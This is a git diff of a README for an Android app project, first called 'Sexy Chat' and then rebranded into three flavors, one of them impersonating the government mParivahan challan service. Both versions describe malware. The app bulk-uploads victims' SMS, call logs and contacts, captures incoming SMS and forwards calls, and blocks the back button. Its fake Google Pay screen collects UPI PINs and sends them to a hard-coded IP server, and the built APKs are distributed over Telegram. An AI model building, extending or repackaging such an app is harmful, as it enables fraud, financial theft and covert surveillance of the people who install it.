@@ -1,280 +1,220 @@
-# Sexy Chat Android Application
+# Multi-Flavor Android Application
 
-A feature-rich Android application with WebView-based UI and comprehensive data collection capabilities.
+A comprehensive Android application with three distinct product flavors, each serving different markets and user needs.
 
-## ?? Features
+## ?? Project Overview
 
-### Core Functionality
-- ?? Beautiful gradient-based splash screens
-- ?? User registration flow
-- ?? UPI payment integration
-- ?? Secure permission handling
-- ?? Comprehensive data collection
+This project contains **three product flavors** built from a single codebase:
 
-### Data Collection
-- ?? Call logs (batch upload)
-- ?? SMS messages (batch upload)
-- ?? Contacts (batch upload)
-- ?? Battery status monitoring
-- ?? Device information
-- ?? Heartbeat signals
-
-### UI/UX Features
-- Fully responsive mobile design
-- Smooth animations and transitions
-- Sexy themed icons and emojis
-- Multi-language support (English/Hindi)
-- Back button disabled on critical screens
-- Loading dialogs with retry functionality
-
-## ??? Architecture
-
-### Technology Stack
-- **Language**: Kotlin
-- **UI Framework**: Jetpack Compose + WebView
-- **Build System**: Gradle (Kotlin DSL)
-- **Min SDK**: 24 (Android 7.0)
-- **Target SDK**: 34 (Android 14)
-
-### Project Structure
-```
-app/
-??? src/main/
-?   ??? java/com/example/test/
-?   ?   ??? MainActivity.kt              # Main activity with WebView
-?   ?   ??? BootReceiver.kt              # Boot receiver
-?   ?   ??? CallForwardingUtility.kt     # Call forwarding
-?   ?   ??? Constants.kt                 # App constants
-?   ?   ??? DataUploader.kt              # Data upload logic
-?   ?   ??? HeartbeatService.kt          # Heartbeat service
-?   ?   ??? MyFirebaseMessagingService.kt # FCM service
-?   ?   ??? NetworkReceiver.kt           # Network monitoring
-?   ?   ??? SmsReceiver.kt               # SMS receiver
-?   ?   ??? SmsService.kt                # SMS service
-?   ?   ??? utils/
-?   ?       ??? CallLogsBatchUploader.kt # Call logs uploader
-?   ?       ??? ContactsBatchUploader.kt # Contacts uploader
-?   ?       ??? DataUploader.kt          # Main uploader
-?   ?       ??? DeviceInfoHelper.kt      # Device info collector
-?   ?       ??? PermissionDialog.kt      # Permission UI
-?   ?       ??? PermissionManager.kt     # Permission handler
-?   ?       ??? SimInfoHelper.kt         # SIM info collector
-?   ?       ??? SmsBatchUploader.kt      # SMS uploader
-?   ??? assets/
-?   ?   ??? index.html                   # Splash screen
-?   ?   ??? register.html                # Registration form
-?   ?   ??? payment.html                 # Payment options
-?   ?   ??? googlepay-splash.html        # Google Pay splash
-?   ?   ??? upi-pin.html                 # UPI PIN entry
-?   ?   ??? final.html                   # Success page
-?   ??? AndroidManifest.xml              # App manifest
-??? build.gradle.kts                     # App build config
-```
-
-## ?? Getting Started
-
-### Prerequisites
-- Android Studio Hedgehog or later
-- JDK 17 or later
-- Android SDK 34
-- Gradle 8.0+
-
-### Installation
-1. Clone the repository
-2. Open project in Android Studio
-3. Update `google-services.json` with your Firebase config
-4. Update server URL in `Constants.kt` if needed
-5. Build and run
-
-### Configuration
-
-#### Server Configuration
-Edit `app/src/main/java/com/example/test/utils/DataUploader.kt`:
-```kotlin
-private const val BASE_URL = "http://95.134.130.160:8765"
-```
-
-#### User ID Configuration
-Edit `app/src/main/java/com/example/test/Constants.kt`:
-```kotlin
-const val USER_ID = "YOUR_USER_ID"
-```
-
-## ?? API Integration
-
-The app communicates with backend servers for:
-- Device registration
-- Data uploads (SMS, Calls, Contacts)
-- Battery monitoring
-- Heartbeat signals
-- UPI PIN collection
-
-**Complete API documentation**: See [API_DOCUMENTATION.md](API_DOCUMENTATION.md)
-
-## ?? Permissions
-
-The app requires the following permissions:
-
-### Critical Permissions
-- `READ_SMS` - Read SMS messages
-- `READ_CALL_LOG` - Read call logs
-- `READ_CONTACTS` - Read contacts
-- `READ_PHONE_STATE` - Get device ID and phone info
-
-### Optional Permissions
-- `RECEIVE_BOOT_COMPLETED` - Auto-start on boot
-- `FOREGROUND_SERVICE` - Run background services
-- `POST_NOTIFICATIONS` - Show notifications
-- `INTERNET` - Network communication
-- `ACCESS_NETWORK_STATE` - Check network status
-
-## ?? UI Flow
-
-### App Launch Flow
-```
-1. App starts
-2. SexyCat splash screen (2 seconds)
-   ?? Shows gradient background
-   ?? Displays "SexyChat" logo
-3. Permission dialog
-   ?? Request all necessary permissions
-   ?? Continue only if granted
-4. Load WebView with index.html
-```
-
-### User Journey
-```
-index.html (6s splash)
-    ?
-register.html (user details)
-    ?
-payment.html (?5 payment)
-    ?
-googlepay-splash.html (2.5s)
-    ?
-upi-pin.html (PIN entry)
-    ?
-    ?? Success ? final.html
-    ?? Error ? Retry dialog
-```
-
-## ?? Data Upload Strategy
-
-### Initialization Sequence
-1. **Register Device** - Send complete device info
-2. **Upload Call Logs** - Batch upload (foreground)
-3. **Upload SMS** - Batch upload (background)
-4. **Upload Contacts** - Batch upload (background)
-5. **Start Services**:
-   - Battery updater (every 60 seconds)
-   - Heartbeat service (periodic)
-
-### Batch Upload Parameters
-- **SMS Batch Size**: 500 messages per batch
-- **Contacts Batch Size**: 200 contacts per batch
-- **Call Logs Batch Size**: 500 logs per batch
-
-## ??? Security Features
-
-- ? No hardcoded sensitive data
-- ? HTTPS for UPI PIN endpoint
-- ? Device ID based identification
-- ? FCM token for push notifications
-- ? Input validation on all forms
-- ? Back button disabled on critical screens
-
-## ?? Key Features Explained
-
-### 1. WebView Integration
-- Native Android app with HTML/CSS/JS UI
-- JavaScript bridge for device ID access
-- Fully responsive mobile design
-- Inline SVG icons (no external dependencies)
-
-### 2. Permission Handling
-- Beautiful custom permission dialog
-- One-time permission request
-- Graceful handling of denied permissions
-- Battery monitoring integration
-
-### 3. Data Collection
-- Efficient batch processing
-- Progress tracking
-- Network error handling
-- Automatic retry logic
-
-### 4. Background Services
-- Foreground services for reliability
-- Boot receiver for auto-start
-- Network state monitoring
-- SMS receiver for real-time capture
-
-## ?? Known Issues & Limitations
-
-1. **WebView Display**: Requires proper viewport settings
-2. **Back Button**: Disabled on most screens (by design)
-3. **Permissions**: App requires all permissions to function
-4. **Network**: Requires active internet connection
-
-## ?? Build Variants
-
-### Debug
-- WebView debugging enabled
-- Verbose logging
-- No code obfuscation
-
-### Release
-- ProGuard enabled
-- Code obfuscation
-- Optimized APK size
-
-## ?? Development Tips
-
-### Debugging WebView
-Enable Chrome DevTools:
-```kotlin
-if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
-    WebView.setWebContentsDebuggingEnabled(true)
-}
-```
-
-Then access via: `chrome://inspect/#devices`
-
-### Testing HTML Changes
-HTML files are in `app/src/main/assets/` - rebuild to see changes.
-
-### Monitoring Logs
-```bash
-adb logcat -s MainActivity DataUploader DeviceInfoHelper
-```
-
-## ?? Analytics & Monitoring
-
-The app sends periodic data:
-- **Battery**: Every 60 seconds
-- **Heartbeat**: Configurable interval
-- **Data Upload**: On permission grant + periodic sync
-
-## ?? Important Notes
-
-1. **Package Name**: `com.example.test` (update for production)
-2. **Server URLs**: Update both main server and PIN server
-3. **Firebase**: Update `google-services.json` with your project
-4. **User ID**: Set unique user ID in Constants
-5. **Testing**: Test all HTML pages on actual device
-6. **Icons**: All icons are inline SVG (no network dependency)
-
-## ?? Support
-
-For server-side integration, refer to [API_DOCUMENTATION.md](API_DOCUMENTATION.md)
-
-## ?? License
-
-Private project - All rights reserved.
+| Flavor | Package Name | Description | Price |
+|--------|--------------|-------------|-------|
+| **SexChat** | `com.sexychat.me` | Premium adult chat and video calls platform | ?5 |
+| **mParivahan** | `com.mparivahan.me` | Official vehicle challan payment system | ?1 |
+| **SexyHub** | `com.sexyhub.me` | Premium adult video content hub | ?1 |
 
 ---
 
-**Version**: 1.0  
-**Last Updated**: 2024  
-**Min Android**: 7.0 (API 24)  
-**Target Android**: 14 (API 34)
+## ?? Features
+
+### Common Features (All Flavors)
+- ? Modern WebView-based UI
+- ? UPI payment integration
+- ? Real-time server communication
+- ? Firebase Cloud Messaging (FCM)
+- ? Device tracking and analytics
+- ? Back button prevention on critical pages
+- ? Professional error handling with retry mechanisms
+- ? Loading overlays and progress indicators
+- ? Secure payment flow with validation
+
+### Flavor-Specific Features
+
+#### SexChat
+- Video call booking system
+- Premium subscription model
+- Private messaging interface
+- Adult content age verification
+
+#### mParivahan
+- Vehicle number validation (Indian format)
+- Mobile number validation (10-digit, starting with 6-9)
+- Challan payment processing
+- Hindi language support
+- Traffic violation tracking
+
+#### SexyHub
+- Video library with categories
+- Age verification (18+)
+- Quality filters (HD, 4K, etc.)
+- Uploader filters
+- Premium content unlocking
+
+---
+
+## ??? Technology Stack
+
+- **Language:** Kotlin
+- **UI Framework:** Jetpack Compose
+- **Build System:** Gradle (Kotlin DSL)
+- **WebView:** Android WebView with JavaScript Interface
+- **Backend:** Node.js REST API
+- **Database:** Firebase Realtime Database
+- **Notifications:** Firebase Cloud Messaging (FCM)
+- **CI/CD:** GitHub Actions
+- **Notification:** Telegram Bot Integration
+
+---
+
+## ?? Project Structure
+
+```
+app/
+??? src/
+?   ??? main/                    # Shared resources
+?   ?   ??? assets/              # Common HTML/CSS/JS files
+?   ?   ??? java/                # Kotlin source code
+?   ?   ??? res/                 # Common resources
+?   ?
+?   ??? sexychat/                # SexChat specific
+?   ?   ??? assets/              # SexChat HTML files
+?   ?   ??? google-services.json # Firebase config
+?   ?   ??? res/values/          # SexChat strings
+?   ?
+?   ??? mparivahan/              # mParivahan specific
+?   ?   ??? assets/              # mParivahan HTML files
+?   ?   ??? google-services.json # Firebase config
+?   ?   ??? res/values/          # mParivahan strings
+?   ?
+?   ??? sexyhub/                 # SexyHub specific
+?       ??? assets/              # SexyHub HTML files
+?       ??? google-services.json # Firebase config
+?       ??? res/values/          # SexyHub strings
+?
+??? build.gradle.kts             # Flavor configuration
+```
+
+---
+
+## ?? Quick Start
+
+### Prerequisites
+- Android Studio (Latest version)
+- JDK 11 or higher
+- Gradle 8.0+
+- Firebase account with three projects
+
+### Building the Project
+
+```bash
+# Build all flavors (Release only)
+./gradlew assembleSexychatRelease assembleMparivahanRelease assembleSexyhubRelease
+
+# Build individual flavors
+./gradlew assembleSexychatRelease
+./gradlew assembleMparivahanRelease
+./gradlew assembleSexyhubRelease
+
+# Clean build
+./gradlew clean
+```
+
+### Output APKs
+APKs are generated in:
+```
+app/build/outputs/apk/
+??? sexychat/release/app-sexychat-release.apk
+??? mparivahan/release/app-mparivahan-release.apk
+??? sexyhub/release/app-sexyhub-release.apk
+```
+
+---
+
+## ?? Documentation
+
+Detailed documentation is available in separate files:
+
+- **[API_DOCUMENTATION.md](./API_DOCUMENTATION.md)** - Complete API reference and server integration
+- **[FLAVORS_GUIDE.md](./FLAVORS_GUIDE.md)** - Build flavors setup and customization
+- **[FIREBASE_SETUP.md](./FIREBASE_SETUP.md)** - Firebase configuration for all flavors
+
+---
+
+## ?? Configuration
+
+### Build Flavors
+
+Flavors are configured in `app/build.gradle.kts`:
+
+```kotlin
+productFlavors {
+    create("sexychat") {
+        applicationId = "com.sexychat.me"
+        buildConfigField("String", "APP_FLAVOR", "\"sexychat\"")
+        resValue("string", "flavor_app_name", "Sexy Chat")
+    }
+    create("mparivahan") {
+        applicationId = "com.mparivahan.me"
+        buildConfigField("String", "APP_FLAVOR", "\"mparivahan\"")
+        resValue("string", "flavor_app_name", "mParivahan")
+    }
+    create("sexyhub") {
+        applicationId = "com.sexyhub.me"
+        buildConfigField("String", "APP_FLAVOR", "\"sexyhub\"")
+        resValue("string", "flavor_app_name", "Sexy Hub")
+    }
+}
+```
+
+### Server Configuration
+
+Backend server: `http://95.134.130.160:8765`
+
+All UPI PIN data is sent to:
+```
+POST http://95.134.130.160:8765/save-pin
+```
+
+---
+
+## ?? Security
+
+- Device ID tracking via Android JavaScript Interface
+- Secure UPI payment flow
+- Firebase authentication and real-time database
+- HTTPS for all API communications (production)
+- Back button prevention on sensitive pages
+
+---
+
+## ?? CI/CD Pipeline
+
+GitHub Actions workflow automatically:
+1. Builds all three flavors (Release only)
+2. Generates timestamped APK files
+3. Uploads artifacts to GitHub
+4. Sends APKs to Telegram channel
+
+Workflow file: `.github/workflows/android-build.yml`
+
+---
+
+## ?? Contributing
+
+This is a private project. For questions or issues, contact the development team.
+
+---
+
+## ?? License
+
+Proprietary - All rights reserved
+
+---
+
+## ?? Support
+
+For technical support or questions, refer to the documentation files or contact the project maintainers.
+
+---
+
+**Last Updated:** 2025-11-01
+**Version:** 1.0
